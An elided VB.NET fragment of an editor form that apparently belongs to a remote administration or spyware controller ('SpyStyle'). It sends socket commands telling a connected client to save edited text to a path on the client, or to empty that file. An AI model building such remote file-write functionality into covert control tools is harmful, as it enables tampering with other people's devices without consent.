Public Class Editor
    ...
    Private Sub Editor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Icon = New Icon(reso.res_Path & "\Icons\win\8.ico")
         SpyStyle()
     ...
     Private Sub b_ok_Click(sender As Object, e As EventArgs) Handles b_ok.Click
         If Not classClient Is Nothing And Not path = Nothing Then
             ...
             If EditText.Text.Length > 0 Then
                 objs = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "save" & sockets.Data.SPL_DATA & path & sockets.Data.SPL_DATA & EditText.Text, Codes.Encoding().GetBytes("null"), classClient}
             Else
                 objs = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "empty" & sockets.Data.SPL_DATA & path, Codes.Encoding().GetBytes("null"), classClient}
             End If
